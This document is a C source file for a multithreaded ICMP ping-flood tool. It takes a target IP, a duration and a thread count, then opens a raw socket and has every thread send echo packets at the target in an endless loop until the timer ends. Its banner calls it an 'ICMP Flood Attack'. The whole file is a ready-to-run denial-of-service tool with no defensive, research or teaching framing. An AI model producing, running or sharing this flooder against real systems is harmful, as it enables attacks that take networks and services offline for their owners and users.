#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <netinet/ip_icmp.h>

volatile int running = 1;
unsigned long long total_packets = 0;
int sock;

unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    for (; len > 1; len -= 2) sum += *buf++;
    if (len == 1) sum += *(unsigned char*)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return ~sum;
}

void *attack_thread(void *arg) {
    struct sockaddr_in dest;
    char packet[64];
    struct icmphdr *icmp = (struct icmphdr*)packet;
    char *ip = (char*)arg;
    
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = inet_addr(ip);
    
    icmp->type = ICMP_ECHO;
    icmp->code = 0;
    icmp->un.echo.id = rand() % 65535;
    icmp->un.echo.sequence = rand() % 65535;
    
    while (running) {
        icmp->checksum = 0;
        icmp->checksum = checksum(packet, sizeof(struct icmphdr));
        sendto(sock, packet, sizeof(struct icmphdr), 0, (struct sockaddr*)&dest, sizeof(dest));
        total_packets++;
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    signal(SIGINT, exit);
    srand(time(NULL));
    
    if (argc < 4) {
        printf("ICMP Flood: ./icmp_leak <IP> <TIME> <THREADS>\n");
        return 1;
    }
    
    char *ip = argv[1];
    int duration = atoi(argv[2]);
    int threads = atoi(argv[3]);
    
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) {
        printf("Need root! Run: sudo ./icmp_leak\n");
        return 1;
    }
    
    printf("\n🔥 ICMP Flood Attack\n🎯 %s\n⏱️ %ds\n🔧 %d threads\n\n", ip, duration, threads);
    
    pthread_t t[threads];
    for (int i = 0; i < threads; i++)
        pthread_create(&t[i], NULL, attack_thread, ip);
    
    sleep(duration);
    running = 0;
    for (int i = 0; i < threads; i++)
        pthread_join(t[i], NULL);
    
    printf("\n✅ Complete! Packets: %llu\n", total_packets);
    return 0;
}